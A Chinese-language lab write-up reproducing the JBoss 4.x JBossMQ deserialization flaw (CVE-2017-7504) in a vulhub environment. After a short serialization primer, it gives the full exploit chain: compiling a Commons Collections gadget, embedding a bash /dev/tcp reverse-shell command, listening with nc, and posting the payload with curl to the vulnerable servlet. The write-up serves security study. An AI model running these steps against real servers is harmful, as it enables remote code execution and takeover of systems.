JBoss 4.x JBossMQ JMS 反序列化漏洞（CVE-2017-7504）
2022-12-29 23:03:51

1、 声明

文章只做学习交流，切勿用作其他用途。

2、前言

序列化就是把对象转换成字节流，便于保存在内存，文件，数据库中，反序列化即逆过程，由字节流还原成对象，Java中的ObjectOutputStream类的writeObject()方法可以实现序列化，ObjectInputStream类的readObject()方法用于反序列化，问题的根源在于类ObjectInputStream在反序列化时，没有对生成的对象的类型做限制。

`public class ceShi {
public static void main(String[] args) throws IOException, ClassNotFoundException {
String obj = "hello world";
//将序列化对象写入文件Object.db中
FileOutputStream fos = new FileOutputStream("Object.db");
ObjectOutputStream os = new ObjectOutputStream(fos);
//写入obj
os.writeObject(obj);
//关闭流
os.close();

`
//从文件object.db中读取数据
FileInputStream fis = new FileInputStream("object.db");
ObjectInputStream ois = new ObjectInputStream(fis);

//通过反序列化恢复对象
String obj2 = (String) ois.readObject();
//关闭流
ois.close();


}
}`

函数解读：
FileOutputStream：意为文件输出流，是用于将数据写入File或者FileDescriptor的输出流。
ObjectOutputStream：是将一个对象写入文件：如果使用这个类写入对象，这个对象需要序列化(要实现Serializable)。
FileInputStream：可以从文件系统中的某个文件中获取输入字节，获取的文件可用性取决于主机环境。
ObjectInputStream：是从文件中读一个对象，进行反序列化。

Apache Commons Collections 是一个扩展了Java标准库的Collection结构的第三方基础库，它提供了很多强有力的数据结构类型并且实现了各种集合工具类。
首先这个漏洞与CVE-2017-7501一样，都利用了Apache Commons Collections的基础库进行Java反序列化漏洞的利用，差别在于CVE-2017-7504利用路径是/jbossmq-httpil/HTTPServerILServlet，CVE-2015-7501的利用路径是/invoker/JMXInvokerServlet。

3、环境启动

我们这里利用vulhub靶场进行复现。
cd CVE-2017-7504
docker-compose up -d
docker-compose config

我们访问页面：http://192.168.61.129:8080/


这样环境就启动成功了。

4、漏洞复现

攻击机器：kali(192.168.61.128)
目标机器：ubuntu(192.168.61.129)
1、我们首先下载exp文件：https://github.com/joaomatosf/JavaDeserH2HC
2、避开误区：通常情况下，我们的kali它的java版本都是11，17或者跟高的版本，这样我们在执行恶意文件的时候，会出现错误，我们需要将kali的java版本换成1.8版本。
具体操作细节参考：https://blog.csdn.net/qq_44029310/article/details/126086895
3、选择ExampleCommonsCollections1WithHashMap，编译并生成序列化数据。
javac -cp .:commons-collections-3.2.1.jar ExampleCommonsCollections1WithHashMap.java

执行完成之后，生成一个ExampleCommonsCollections1WithHashMap.class文件。
4、执行第二条命令。
java -cp .:commons-collections-3.2.1.jar ExampleCommonsCollections1WithHashMap "bash -i >& /dev/tcp/192.168.61.128/4444 0>&1"

这里填上需要反弹服务器的IP和端口，切记端口不能冲突。

第二条命令生成ExampleCommonsCollections1WithHashMap.ser文件。
5、我们在kali进行监听。
nc -lvp 4444

6、发射，将该文件作为请求数据主体发送如下数据包。
curl http://192.168.61.129:8080/jbossmq-httpil/HTTPServerILServlet --data-binary @ExampleCommonsCollections1WithHashMap.ser

7、反弹成功
